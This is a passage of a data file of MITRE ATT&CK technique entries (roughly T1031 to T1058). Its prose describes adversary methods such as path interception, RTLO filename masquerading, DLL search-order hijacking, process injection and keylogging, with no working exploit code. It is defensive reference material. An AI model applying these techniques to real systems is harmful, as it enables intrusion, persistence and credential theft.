           'description': "Windows service configuration information, including the file path to the service's "
                          'executable or recovery programs/commands, is stored in the Registry. Service configurations '
                          'can be modified using utilities such as sc.exe and '
                          '[Reg](https://attack.mitre.org/software/S0075).\n'
                          '\n'
                          'Adversaries can modify an existing service to persist malware on a system by using system '
                          'utilities or by using custom tools to interact with the Windows API. Use of existing '
                          'services is a type of [Masquerading](https://attack.mitre.org/techniques/T1036) that may '
                          'make detection analysis more challenging. Modifying existing services may interrupt their '
                          'functionality or may enable services that are disabled or otherwise not commonly used.\n'
                          '\n'
                          'Adversaries may also intentionally corrupt or kill services to execute malicious recovery '
                          'programs/commands. (Citation: Twitter Service Recovery Nov 2017) (Citation: Microsoft '
                          'Service Recovery Feb 2013)',
           'name': 'Modify Existing Service',
           'platforms': ['Windows']},
 'T1032': {'attack_id': 'T1032',
           'categories': ['command-and-control'],
           'description': 'Adversaries may explicitly employ a known encryption algorithm to conceal command and '
                          'control traffic rather than relying on any inherent protections provided by a communication '
                          'protocol. Despite the use of a secure algorithm, these implementations may be vulnerable to '
                          'reverse engineering if necessary secret keys are encoded and/or generated within malware '
                          'samples/configuration files.',
           'name': 'Standard Cryptographic Protocol',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1033': {'attack_id': 'T1033',
           'categories': ['discovery'],
           'description': '### Windows\n'
                          '\n'
                          'Adversaries may attempt to identify the primary user, currently logged in user, set of '
                          'users that commonly uses a system, or whether a user is actively using the system. They may '
                          'do this, for example, by retrieving account usernames or by using [Credential '
                          'Dumping](https://attack.mitre.org/techniques/T1003). The information may be collected in a '
                          'number of different ways using other Discovery techniques, because user and username '
                          'details are prevalent throughout a system and include running process ownership, '
                          'file/directory ownership, session information, and system logs.\n'
                          '\n'
                          '### Mac\n'
                          '\n'
                          'On Mac, the currently logged in user can be identified with '
                          '<code>users</code>,<code>w</code>, and <code>who</code>.\n'
                          '\n'
                          '### Linux\n'
                          '\n'
                          'On Linux, the currently logged in user can be identified with <code>w</code> and '
                          '<code>who</code>.',
           'name': 'System Owner/User Discovery',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1034': {'attack_id': 'T1034',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'Path interception occurs when an executable is placed in a specific path so that it is '
                          'executed by an application instead of the intended target. One example of this was the use '
                          'of a copy of [cmd](https://attack.mitre.org/software/S0106) in the current working '
                          'directory of a vulnerable application that loads a CMD or BAT file with the CreateProcess '
                          'function. (Citation: TechNet MS14-019)\n'
                          '\n'
                          'There are multiple distinct weaknesses or misconfigurations that adversaries may take '
                          'advantage of when performing path interception: unquoted paths, path environment variable '
                          'misconfigurations, and search order hijacking. The first vulnerability deals with full '
                          'program paths, while the second and third occur when program paths are not specified. These '
                          'techniques can be used for persistence if executables are called on a regular basis, as '
                          'well as privilege escalation if intercepted executables are started by a higher privileged '
                          'process.\n'
                          '\n'
                          '### Unquoted Paths\n'
                          'Service paths (stored in Windows Registry keys) (Citation: Microsoft Subkey) and shortcut '
                          'paths are vulnerable to path interception if the path has one or more spaces and is not '
                          'surrounded by quotation marks (e.g., <code>C:\\unsafe path with space\\program.exe</code> '
                          'vs. <code>"C:\\safe path with space\\program.exe"</code>). (Citation: Baggett 2012) An '
                          'adversary can place an executable in a higher level directory of the path, and Windows will '
                          'resolve that executable instead of the intended executable. For example, if the path in a '
                          'shortcut is <code>C:\\program files\\myapp.exe</code>, an adversary may create a program at '
                          '<code>C:\\program.exe</code> that will be run instead of the intended program. (Citation: '
                          'SecurityBoulevard Unquoted Services APR 2018) (Citation: SploitSpren Windows Priv Jan '
                          '2018)\n'
                          '\n'
                          '### PATH Environment Variable Misconfiguration\n'
                          'The PATH environment variable contains a list of directories. Certain methods of executing '
                          'a program (namely using cmd.exe or the command-line) rely solely on the PATH environment '
                          'variable to determine the locations that are searched for a program when the path for the '
                          'program is not given. If any directories are listed in the PATH environment variable before '
                          'the Windows directory, <code>%SystemRoot%\\system32</code> (e.g., '
                          '<code>C:\\Windows\\system32</code>), a program may be placed in the preceding directory '
                          'that is named the same as a Windows program (such as cmd, PowerShell, or Python), which '
                          'will be executed when that command is executed from a script or command-line.\n'
                          '\n'
                          'For example, if <code>C:\\example path</code> precedes <code>C:\\Windows\\system32</code> '
                          'is in the PATH environment variable, a program that is named net.exe and placed in '
                          '<code>C:\\example path</code> will be called instead of the Windows system "net" when "net" '
                          'is executed from the command-line.\n'
                          '\n'
                          '### Search Order Hijacking\n'
                          'Search order hijacking occurs when an adversary abuses the order in which Windows searches '
                          'for programs that are not given a path. The search order differs depending on the method '
                          'that is used to execute the program. (Citation: Microsoft CreateProcess) (Citation: Hill NT '
                          'Shell) (Citation: Microsoft WinExec) However, it is common for Windows to search in the '
                          'directory of the initiating program before searching through the Windows system directory. '
                          'An adversary who finds a program vulnerable to search order hijacking (i.e., a program that '
                          'does not specify the path to an executable) may take advantage of this vulnerability by '
                          'creating a program named after the improperly specified program and placing it within the '
                          "initiating program's directory.\n"
                          '\n'
                          'For example, "example.exe" runs "cmd.exe" with the command-line argument <code>net '
                          'user</code>. An adversary may place a program called "net.exe" within the same directory as '
                          'example.exe, "net.exe" will be run instead of the Windows system utility net. In addition, '
                          'if an adversary places a program called "net.com" in the same directory as "net.exe", then '
                          '<code>cmd.exe /C net user</code> will execute "net.com" instead of "net.exe" due to the '
                          'order of executable extensions defined under PATHEXT. (Citation: MSDN Environment '
                          'Property)\n'
                          '\n'
                          'Search order hijacking is also a common practice for hijacking DLL loads and is covered in '
                          '[DLL Search Order Hijacking](https://attack.mitre.org/techniques/T1038).',
           'name': 'Path Interception',
           'platforms': ['Windows']},
 'T1035': {'attack_id': 'T1035',
           'categories': ['execution'],
           'description': 'Adversaries may execute a binary, command, or script via a method that interacts with '
                          'Windows services, such as the Service Control Manager. This can be done by either creating '
                          'a new service or modifying an existing service. This technique is the execution used in '
                          'conjunction with [New Service](https://attack.mitre.org/techniques/T1050) and [Modify '
                          'Existing Service](https://attack.mitre.org/techniques/T1031) during service persistence or '
                          'privilege escalation.',
           'name': 'Service Execution',
           'platforms': ['Windows']},
 'T1036': {'attack_id': 'T1036',
           'categories': ['defense-evasion'],
           'description': 'Masquerading occurs when the name or location of an executable, legitimate or malicious, is '
                          'manipulated or abused for the sake of evading defenses and observation. Several different '
                          'variations of this technique have been observed.\n'
                          '\n'
                          'One variant is for an executable to be placed in a commonly trusted directory or given the '
                          'name of a legitimate, trusted program. Alternatively, the filename given may be a close '
                          'approximation of legitimate programs or something innocuous. An example of this is when a '
                          'common system utility or program is moved and renamed to avoid detection based on its '
                          'usage.(Citation: FireEye APT10 Sept 2018) This is done to bypass tools that trust '
                          'executables by relying on file name or path, as well as to deceive defenders and system '
                          'administrators into thinking a file is benign by associating the name with something that '
                          'is thought to be legitimate.\n'
                          '\n'
                          'A third variant uses the right-to-left override (RTLO or RLO) character (U+202E) as a means '
                          'of tricking a user into executing what they think is a benign file type but is actually '
                          'executable code. RTLO is a non-printing character that causes the text that follows it to '
                          'be displayed in reverse.(Citation: Infosecinstitute RTLO Technique) For example, a Windows '
                          'screensaver file named\xa0<code>March 25 \\u202Excod.scr</code> will display as <code>March '
                          '25 rcs.docx</code>. A JavaScript file named <code>photo_high_re\\u202Egnp.js</code> will be '
                          'displayed as <code>photo_high_resj.png</code>. A common use of this technique is with '
                          'spearphishing attachments since it can trick both end users and defenders if they are not '
                          'aware of how their tools display and render the RTLO character. Use of the RTLO character '
                          'has been seen in many targeted intrusion attempts and criminal activity.(Citation: Trend '
                          'Micro PLEAD RTLO)(Citation: Kaspersky RTLO Cyber Crime) RTLO can be used in the Windows '
                          'Registry as well, where regedit.exe displays the reversed characters but the command line '
                          'tool reg.exe does not by default.\xa0\n'
                          '\n'
                          '### Windows\n'
                          'In another variation of this technique, an adversary may use a renamed copy of a legitimate '
                          'utility, such as rundll32.exe. (Citation: Endgame Masquerade Ball) An alternative case '
                          'occurs when a legitimate utility is moved to a different directory and also renamed to '
                          'avoid detections based on system utilities executing from non-standard paths. (Citation: '
                          'F-Secure CozyDuke)\n'
                          '\n'
                          'An example of abuse of trusted locations in Windows would be the '
                          '<code>C:\\Windows\\System32</code> directory. Examples of trusted binary names that can be '
                          'given to malicious binares include "explorer.exe" and "svchost.exe".\n'
                          '\n'
                          '### Linux\n'
                          'Another variation of this technique includes malicious binaries changing the name of their '
                          'running process to that of a trusted or benign process, after they have been launched as '
                          'opposed to before. (Citation: Remaiten)\n'
                          '\n'
                          'An example of abuse of trusted locations in Linux  would be the <code>/bin</code> '
                          'directory. Examples of trusted binary names that can be given to malicious binares include '
                          '"rsyncd" and "dbus-inotifier". (Citation: Fysbis Palo Alto Analysis)  (Citation: Fysbis Dr '
                          'Web Analysis)',
           'name': 'Masquerading',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1037': {'attack_id': 'T1037',
           'categories': ['lateral-movement', 'persistence'],
           'description': '### Windows\n'
                          '\n'
                          'Windows allows logon scripts to be run whenever a specific user or group of users log into '
                          'a system. (Citation: TechNet Logon Scripts) The scripts can be used to perform '
                          'administrative functions, which may often execute other programs or send information to an '
                          'internal logging server.\n'
                          '\n'
                          'If adversaries can access these scripts, they may insert additional code into the logon '
                          'script to execute their tools when a user logs in. This code can allow them to maintain '
                          'persistence on a single system, if it is a local script, or to move laterally within a '
                          'network, if the script is stored on a central server and pushed to many systems. Depending '
                          'on the access configuration of the logon scripts, either local credentials or an '
                          'administrator account may be necessary.\n'
                          '\n'
                          '### Mac\n'
                          '\n'
                          'Mac allows login and logoff hooks to be run as root whenever a specific user logs into or '
                          'out of a system. A login hook tells Mac OS X to execute a certain script when a user logs '
                          'in, but unlike startup items, a login hook executes as root (Citation: creating login '
                          'hook). There can only be one login hook at a time though. If adversaries can access these '
                          'scripts, they can insert additional code to the script to execute their tools when a user '
                          'logs in.',
           'name': 'Logon Scripts',
           'platforms': ['macOS', 'Windows']},
 'T1038': {'attack_id': 'T1038',
           'categories': ['persistence', 'privilege-escalation', 'defense-evasion'],
           'description': 'Windows systems use a common method to look for required DLLs to load into a program. '
                          '(Citation: Microsoft DLL Search) Adversaries may take advantage of the Windows DLL search '
                          'order and programs that ambiguously specify DLLs to gain privilege escalation and '
                          'persistence. \n'
                          '\n'
                          'Adversaries may perform DLL preloading, also called binary planting attacks, (Citation: '
                          'OWASP Binary Planting) by placing a malicious DLL with the same name as an ambiguously '
                          'specified DLL in a location that Windows searches before the legitimate DLL. Often this '
                          'location is the current working directory of the program. Remote DLL preloading attacks '
                          'occur when a program sets its current directory to a remote location such as a Web share '
                          'before loading a DLL. (Citation: Microsoft 2269637) Adversaries may use this behavior to '
                          'cause the program to load a malicious DLL. \n'
                          '\n'
                          'Adversaries may also directly modify the way a program loads DLLs by replacing an existing '
                          'DLL or modifying a .manifest or .local redirection file, directory, or junction to cause '
                          'the program to load a different DLL to maintain persistence or privilege escalation. '
                          '(Citation: Microsoft DLL Redirection) (Citation: Microsoft Manifests) (Citation: Mandiant '
                          'Search Order)\n'
                          '\n'
                          'If a search order-vulnerable program is configured to run at a higher privilege level, then '
                          'the adversary-controlled DLL that is loaded will also be executed at the higher level. In '
                          'this case, the technique could be used for privilege escalation from user to administrator '
                          'or SYSTEM or from administrator to SYSTEM, depending on the program.\n'
                          '\n'
                          'Programs that fall victim to path hijacking may appear to behave normally because malicious '
                          'DLLs may be configured to also load the legitimate DLLs they were meant to replace.',
           'name': 'DLL Search Order Hijacking',
           'platforms': ['Windows']},
 'T1039': {'attack_id': 'T1039',
           'categories': ['collection'],
           'description': 'Sensitive data can be collected from remote systems via shared network drives (host shared '
                          'directory, network file server, etc.) that are accessible from the current system prior to '
                          'Exfiltration.\n'
                          '\n'
                          'Adversaries may search network shares on computers they have compromised to find files of '
                          'interest. Interactive command shells may be in use, and common functionality within '
                          '[cmd](https://attack.mitre.org/software/S0106) may be used to gather information.',
           'name': 'Data from Network Shared Drive',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1040': {'attack_id': 'T1040',
           'categories': ['credential-access', 'discovery'],
           'description': 'Network sniffing refers to using the network interface on a system to monitor or capture '
                          'information sent over a wired or wireless connection. An adversary may place a network '
                          'interface into promiscuous mode to passively access data in transit over the network, or '
                          'use span ports to capture a larger amount of data.\n'
                          '\n'
                          'Data captured via this technique may include user credentials, especially those sent over '
                          'an insecure, unencrypted protocol. Techniques for name service resolution poisoning, such '
                          'as [LLMNR/NBT-NS Poisoning and Relay](https://attack.mitre.org/techniques/T1171), can also '
                          'be used to capture credentials to websites, proxies, and internal systems by redirecting '
                          'traffic to an adversary.\n'
                          '\n'
                          'Network sniffing may also reveal configuration details, such as running services, version '
                          'numbers, and other network characteristics (ex: IP addressing, hostnames, VLAN IDs) '
                          'necessary for follow-on Lateral Movement and/or Defense Evasion activities.',
           'name': 'Network Sniffing',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1041': {'attack_id': 'T1041',
           'categories': ['exfiltration'],
           'description': 'Data exfiltration is performed over the Command and Control channel. Data is encoded into '
                          'the normal communications channel using the same protocol as command and control '
                          'communications.',
           'name': 'Exfiltration Over Command and Control Channel',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1042': {'attack_id': 'T1042',
           'categories': ['persistence'],
           'description': 'When a file is opened, the default program used to open the file (also called the file '
                          'association or handler) is checked. File association selections are stored in the Windows '
                          'Registry and can be edited by users, administrators, or programs that have Registry access '
                          '(Citation: Microsoft Change Default Programs) (Citation: Microsoft File Handlers) or by '
                          'administrators using the built-in assoc utility. (Citation: Microsoft Assoc Oct 2017) '
                          'Applications can modify the file association for a given file extension to call an '
                          'arbitrary program when a file with the given extension is opened.\n'
                          '\n'
                          'System file associations are listed under <code>HKEY_CLASSES_ROOT\\.[extension]</code>, for '
                          'example <code>HKEY_CLASSES_ROOT\\.txt</code>. The entries point to a handler for that '
                          'extension located at <code>HKEY_CLASSES_ROOT\\[handler]</code>. The various commands are '
                          'then listed as subkeys underneath the shell key at '
                          '<code>HKEY_CLASSES_ROOT\\[handler]\\shell\\[action]\\command</code>. For example:\n'
                          '* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\open\\command</code>\n'
                          '* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\print\\command</code>\n'
                          '* <code>HKEY_CLASSES_ROOT\\txtfile\\shell\\printto\\command</code>\n'
                          '\n'
                          'The values of the keys listed are commands that are executed when the handler opens the '
                          'file extension. Adversaries can modify these values to continually execute arbitrary '
                          'commands. (Citation: TrendMicro TROJ-FAKEAV OCT 2012)',
           'name': 'Change Default File Association',
           'platforms': ['Windows']},
 'T1043': {'attack_id': 'T1043',
           'categories': ['command-and-control'],
           'description': 'Adversaries may communicate over a commonly used port to bypass firewalls or network '
                          'detection systems and to blend with normal network activity to avoid more detailed '
                          'inspection. They may use commonly open ports such as\n'
                          '\n'
                          '* TCP:80 (HTTP)\n'
                          '* TCP:443 (HTTPS)\n'
                          '* TCP:25 (SMTP)\n'
                          '* TCP/UDP:53 (DNS)\n'
                          '\n'
                          'They may use the protocol associated with the port or a completely different protocol. \n'
                          '\n'
                          'For connections that occur internally within an enclave (such as those between a proxy or '
                          'pivot node and other nodes), examples of common ports are \n'
                          '\n'
                          '* TCP/UDP:135 (RPC)\n'
                          '* TCP/UDP:22 (SSH)\n'
                          '* TCP/UDP:3389 (RDP)',
           'name': 'Commonly Used Port',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1044': {'attack_id': 'T1044',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'Processes may automatically execute specific binaries as part of their functionality or to '
                          'perform other actions. If the permissions on the file system directory containing a target '
                          'binary, or permissions on the binary itself, are improperly set, then the target binary may '
                          'be overwritten with another binary using user-level permissions and executed by the '
                          'original process. If the original process and thread are running under a higher permissions '
                          'level, then the replaced binary will also execute under higher-level permissions, which '
                          'could include SYSTEM.\n'
                          '\n'
                          'Adversaries may use this technique to replace legitimate binaries with malicious ones as a '
                          'means of executing code at a higher permissions level. If the executing process is set to '
                          'run at a specific time or during a certain event (e.g., system bootup) then this technique '
                          'can also be used for persistence.\n'
                          '\n'
                          '### Services\n'
                          '\n'
                          'Manipulation of Windows service binaries is one variation of this technique. Adversaries '
                          'may replace a legitimate service executable with their own executable to gain persistence '
                          'and/or privilege escalation to the account context the service is set to execute under '
                          '(local/domain account, SYSTEM, LocalService, or NetworkService). Once the service is '
                          'started, either directly by the user (if appropriate access is available) or through some '
                          'other means, such as a system restart if the service starts on bootup, the replaced '
                          'executable will run instead of the original service executable.\n'
                          '\n'
                          '### Executable Installers\n'
                          '\n'
                          'Another variation of this technique can be performed by taking advantage of a weakness that '
                          'is common in executable, self-extracting installers. During the installation process, it is '
                          'common for installers to use a subdirectory within the <code>%TEMP%</code> directory to '
                          'unpack binaries such as DLLs, EXEs, or other payloads. When installers create '
                          'subdirectories and files they often do not set appropriate permissions to restrict write '
                          'access, which allows for execution of untrusted code placed in the subdirectories or '
                          'overwriting of binaries used in the installation process. This behavior is related to and '
                          'may take advantage of [DLL Search Order '
                          'Hijacking](https://attack.mitre.org/techniques/T1038). Some installers may also require '
                          'elevated privileges that will result in privilege escalation when executing adversary '
                          'controlled code. This behavior is related to [Bypass User Account '
                          'Control](https://attack.mitre.org/techniques/T1088). Several examples of this weakness in '
                          'existing common installers have been reported to software vendors. (Citation: Mozilla '
                          'Firefox Installer DLL Hijack) (Citation: Seclists Kanthak 7zip Installer)',
           'name': 'File System Permissions Weakness',
           'platforms': ['Windows']},
 'T1045': {'attack_id': 'T1045',
           'categories': ['defense-evasion'],
           'description': 'Software packing is a method of compressing or encrypting an executable. Packing an '
                          'executable changes the file signature in an attempt to avoid signature-based detection. '
                          'Most decompression techniques decompress the executable code in memory.\n'
                          '\n'
                          'Utilities used to perform software packing are called packers. Example packers are MPRESS '
                          'and UPX. A more comprehensive list of known packers is available, (Citation: Wikipedia Exe '
                          'Compression) but adversaries may create their own packing techniques that do not leave the '
                          'same artifacts as well-known packers to evade defenses.',
           'name': 'Software Packing',
           'platforms': ['Windows']},
 'T1046': {'attack_id': 'T1046',
           'categories': ['discovery'],
           'description': 'Adversaries may attempt to get a listing of services running on remote hosts, including '
                          'those that may be vulnerable to remote software exploitation. Methods to acquire this '
                          'information include port scans and vulnerability scans using tools that are brought onto a '
                          'system.',
           'name': 'Network Service Scanning',
           'platforms': ['Linux', 'Windows', 'macOS']},
 'T1047': {'attack_id': 'T1047',
           'categories': ['execution'],
           'description': 'Windows Management Instrumentation (WMI) is a Windows administration feature that provides '
                          'a uniform environment for local and remote access to Windows system components. It relies '
                          'on the WMI service for local and remote access and the server message block (SMB) '
                          '(Citation: Wikipedia SMB) and Remote Procedure Call Service (RPCS) (Citation: TechNet RPC) '
                          'for remote access. RPCS operates over port 135. (Citation: MSDN WMI)\n'
                          '\n'
                          'An adversary can use WMI to interact with local and remote systems and use it as a means to '
                          'perform many tactic functions, such as gathering information for Discovery and remote '
                          'Execution of files as part of Lateral Movement. (Citation: FireEye WMI 2015)',
           'name': 'Windows Management Instrumentation',
           'platforms': ['Windows']},
 'T1048': {'attack_id': 'T1048',
           'categories': ['exfiltration'],
           'description': 'Data exfiltration is performed with a different protocol from the main command and control '
                          'protocol or channel. The data is likely to be sent to an alternate network location from '
                          'the main command and control server. Alternate protocols include FTP, SMTP, HTTP/S, DNS, or '
                          'some other network protocol. Different channels could include Internet Web services such as '
                          'cloud storage.',
           'name': 'Exfiltration Over Alternative Protocol',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1049': {'attack_id': 'T1049',
           'categories': ['discovery'],
           'description': 'Adversaries may attempt to get a listing of network connections to or from the compromised '
                          'system they are currently accessing or from remote systems by querying for information over '
                          'the network. \n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          'Utilities and commands that acquire this information include '
                          '[netstat](https://attack.mitre.org/software/S0104), "net use," and "net session" with '
                          '[Net](https://attack.mitre.org/software/S0039).\n'
                          '\n'
                          '### Mac and Linux \n'
                          '\n'
                          'In Mac and Linux, <code>netstat</code> and <code>lsof</code> can be used to list current '
                          'connections. <code>who -a</code> and <code>w</code> can be used to show which users are '
                          'currently logged in, similar to "net session".',
           'name': 'System Network Connections Discovery',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1050': {'attack_id': 'T1050',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'When operating systems boot up, they can start programs or applications called services '
                          "that perform background system functions. (Citation: TechNet Services) A service's "
                          "configuration information, including the file path to the service's executable, is stored "
                          'in the Windows Registry. \n'
                          '\n'
                          'Adversaries may install a new service that can be configured to execute at startup by using '
                          'utilities to interact with services or by directly modifying the Registry. The service name '
                          'may be disguised by using a name from a related operating system or benign software with '
                          '[Masquerading](https://attack.mitre.org/techniques/T1036). Services may be created with '
                          'administrator privileges but are executed under SYSTEM privileges, so an adversary may also '
                          'use a service to escalate privileges from administrator to SYSTEM. Adversaries may also '
                          'directly start services through [Service '
                          'Execution](https://attack.mitre.org/techniques/T1035).',
           'name': 'New Service',
           'platforms': ['Windows']},
 'T1051': {'attack_id': 'T1051',
           'categories': ['lateral-movement'],
           'description': 'Adversaries may add malicious content to an internally accessible website through an open '
                          "network file share that contains the website's webroot or Web content directory (Citation: "
                          'Microsoft Web Root OCT 2016) (Citation: Apache Server 2018) and then browse to that content '
                          'with a Web browser to cause the server to execute the malicious content. The malicious '
                          'content will typically run under the context and permissions of the Web server process, '
                          'often resulting in local system or administrative privileges, depending on how the Web '
                          'server is configured.\n'
                          '\n'
                          'This mechanism of shared access and remote execution could be used for lateral movement to '
                          'the system running the Web server. For example, a Web server running PHP with an open '
                          'network share could allow an adversary to upload a remote access tool and PHP script to '
                          'execute the RAT on the system running the Web server when a specific page is visited. '
                          '(Citation: Webroot PHP 2011)',
           'name': 'Shared Webroot',
           'platforms': ['Windows']},
 'T1052': {'attack_id': 'T1052',
           'categories': ['exfiltration'],
           'description': 'In certain circumstances, such as an air-gapped network compromise, exfiltration could '
                          'occur via a physical medium or device introduced by a user. Such media could be an external '
                          'hard drive, USB drive, cellular phone, MP3 player, or other removable storage and '
                          'processing device. The physical medium or device could be used as the final exfiltration '
                          'point or to hop between otherwise disconnected systems.',
           'name': 'Exfiltration Over Physical Medium',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1053': {'attack_id': 'T1053',
           'categories': ['execution', 'persistence', 'privilege-escalation'],
           'description': 'Utilities such as [at](https://attack.mitre.org/software/S0110) and '
                          '[schtasks](https://attack.mitre.org/software/S0111), along with the Windows Task Scheduler, '
                          'can be used to schedule programs or scripts to be executed at a date and time. A task can '
                          'also be scheduled on a remote system, provided the proper authentication is met to use RPC '
                          'and file and printer sharing is turned on. Scheduling a task on a remote system typically '
                          'required being a member of the Administrators group on the the remote system. (Citation: '
                          'TechNet Task Scheduler Security)\n'
                          '\n'
                          'An adversary may use task scheduling to execute programs at system startup or on a '
                          'scheduled basis for persistence, to conduct remote Execution as part of Lateral Movement, '
                          'to gain SYSTEM privileges, or to run a process under the context of a specified account.',
           'name': 'Scheduled Task',
           'platforms': ['Windows']},
 'T1054': {'attack_id': 'T1054',
           'categories': ['defense-evasion'],
           'description': 'An adversary may attempt to block indicators or events typically captured by sensors from '
                          'being gathered and analyzed. This could include modifying sensor settings stored in '
                          'configuration files and/or Registry keys to disable or maliciously redirect event '
                          'telemetry. (Citation: Microsoft Lamin Sept 2017)\n'
                          '\n'
                          'In the case of network-based reporting of indicators, an adversary may block traffic '
                          'associated with reporting to prevent central analysis. This may be accomplished by many '
                          'means, such as stopping a local process responsible for forwarding telemetry and/or '
                          'creating a host-based firewall rule to block traffic to specific hosts responsible for '
                          'aggregating events, such as security information and event management (SIEM) products.',
           'name': 'Indicator Blocking',
           'platforms': ['Windows']},
 'T1055': {'attack_id': 'T1055',
           'categories': ['defense-evasion', 'privilege-escalation'],
           'description': 'Process injection is a method of executing arbitrary code in the address space of a '
                          'separate live process. Running code in the context of another process may allow access to '
                          "the process's memory, system/network resources, and possibly elevated privileges. Execution "
                          'via process injection may also evade detection from security products since the execution '
                          'is masked under a legitimate process.\n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          'There are multiple approaches to injecting code into a live process. Windows '
                          'implementations include: (Citation: Endgame Process Injection July 2017)\n'
                          '\n'
                          '* **Dynamic-link library (DLL) injection** involves writing the path to a malicious DLL '
                          'inside a process then invoking execution by creating a remote thread.\n'
                          '* **Portable executable injection** involves writing malicious code directly into the '
                          'process (without a file on disk) then invoking execution with either additional code or by '
                          'creating a remote thread. The displacement of the injected code introduces the additional '
                          'requirement for functionality to remap memory references. Variations of this method such as '
                          'reflective DLL injection (writing a self-mapping DLL into a process) and memory module (map '
                          'DLL when writing into process) overcome the address relocation issue. (Citation: Endgame '
                          'HuntingNMemory June 2017)\n'
                          '* **Thread execution hijacking** involves injecting malicious code or the path to a DLL '
                          'into a thread of a process. Similar to [Process '
                          'Hollowing](https://attack.mitre.org/techniques/T1093), the thread must first be suspended.\n'
                          '* **Asynchronous Procedure Call** (APC) injection involves attaching malicious code to the '
                          "APC Queue (Citation: Microsoft APC) of a process's thread. Queued APC functions are "
                          'executed when the thread enters an alterable state. A variation of APC injection, dubbed '
                          '"Early Bird injection", involves creating a suspended process in which malicious code can '
                          "be written and executed before the process' entry point (and potentially subsequent "
                          'anti-malware hooks) via an APC. (Citation: CyberBit Early Bird Apr 2018)  AtomBombing  '
                          '(Citation: ENSIL AtomBombing Oct 2016) is another variation that utilizes APCs to invoke '
                          'malicious code previously written to the global atom table. (Citation: Microsoft Atom '
                          'Table)\n'
                          '* **Thread Local Storage** (TLS) callback injection involves manipulating pointers inside a '
                          "portable executable (PE) to redirect a process to malicious code before reaching the code's "
                          'legitimate entry point. (Citation: FireEye TLS Nov 2017)\n'
                          '\n'
                          '### Mac and Linux\n'
                          '\n'
                          'Implementations for Linux and OS X/macOS systems include: (Citation: Datawire Code '
                          'Injection) (Citation: Uninformed Needle)\n'
                          '\n'
                          '* **LD_PRELOAD, LD_LIBRARY_PATH** (Linux), **DYLD_INSERT_LIBRARIES** (Mac OS X) environment '
                          'variables, or the dlfcn application programming interface (API) can be used to dynamically '
                          'load a library (shared object) in a process which can be used to intercept API calls from '
                          'the running process. (Citation: Phrack halfdead 1997)\n'
                          '* **Ptrace system calls** can be used to attach to a running process and modify it in '
                          'runtime. (Citation: Uninformed Needle)\n'
                          '* **/proc/[pid]/mem** provides access to the memory of the process and can be used to '
                          'read/write arbitrary data to it. This technique is very rare due to its complexity. '
                          '(Citation: Uninformed Needle)\n'
                          '* **VDSO hijacking** performs runtime injection on ELF binaries by manipulating code stubs '
                          'mapped in from the linux-vdso.so shared object. (Citation: VDSO hijack 2009)\n'
                          '\n'
                          'Malware commonly utilizes process injection to access system resources through which '
                          'Persistence and other environment modifications can be made. More sophisticated samples may '
                          'perform multiple process injections to segment modules and further evade detection, '
                          'utilizing named pipes or other inter-process communication (IPC) mechanisms as a '
                          'communication channel.',
           'name': 'Process Injection',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1056': {'attack_id': 'T1056',
           'categories': ['collection', 'credential-access'],
           'description': 'Adversaries can use methods of capturing user input for obtaining credentials for [Valid '
                          'Accounts](https://attack.mitre.org/techniques/T1078) and information Collection that '
                          'include keylogging and user input field interception.\n'
                          '\n'
                          'Keylogging is the most prevalent type of input capture, with many different ways of '
                          'intercepting keystrokes, (Citation: Adventures of a Keystroke) but other methods exist to '
                          'target information for specific purposes, such as performing a UAC prompt or wrapping the '
                          'Windows default credential provider. (Citation: Wrightson 2012)\n'
                          '\n'
                          'Keylogging is likely to be used to acquire credentials for new access opportunities when '
                          '[Credential Dumping](https://attack.mitre.org/techniques/T1003) efforts are not effective, '
                          'and may require an adversary to remain passive on a system for a period of time before an '
                          'opportunity arises.\n'
                          '\n'
                          'Adversaries may also install code on externally facing portals, such as a VPN login page, '
                          'to capture and transmit credentials of users who attempt to log into the service. This '
                          'variation on input capture may be conducted post-compromise using legitimate administrative '
                          'access as a backup measure to maintain network access through [External Remote '
                          'Services](https://attack.mitre.org/techniques/T1133) and [Valid '
                          'Accounts](https://attack.mitre.org/techniques/T1078) or as part of the initial compromise '
                          'by exploitation of the externally facing web service. (Citation: Volexity Virtual Private '
                          'Keylogging)',
           'name': 'Input Capture',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1057': {'attack_id': 'T1057',
           'categories': ['discovery'],
           'description': 'Adversaries may attempt to get information about running processes on a system. Information '
                          'obtained could be used to gain an understanding of common software running on systems '
                          'within the network.\n'
                          '\n'
                          '### Windows\n'
                          '\n'
                          'An example command that would obtain details on processes is "tasklist" using the '
                          '[Tasklist](https://attack.mitre.org/software/S0057) utility.\n'
                          '\n'
                          '### Mac and Linux\n'
                          '\n'
                          'In Mac and Linux, this is accomplished with the <code>ps</code> command.',
           'name': 'Process Discovery',
           'platforms': ['Linux', 'macOS', 'Windows']},
 'T1058': {'attack_id': 'T1058',
           'categories': ['persistence', 'privilege-escalation'],
           'description': 'Windows stores local service configuration information in the Registry under '
                          '<code>HKLM\\SYSTEM\\CurrentControlSet\\Services</code>. The information stored under a '
                          "service's Registry keys can be manipulated to modify a service's execution parameters "
                          'through tools such as the service controller, sc.exe, PowerShell, or '
                          '[Reg](https://attack.mitre.org/software/S0075). Access to Registry keys is controlled '
                          'through Access Control Lists and permissions. (Citation: MSDN Registry Key Security)\n'
                          '\n'
                          'If the permissions for users and groups are not properly set and allow access to the '
                          'Registry keys for a service, then adversaries can change the service binPath/ImagePath to '
                          'point to a different executable under their control. When the service starts or is '
                          'restarted, then the adversary-controlled program will execute, allowing the adversary to '
                          'gain persistence and/or privilege escalation to the account context the service is set to '
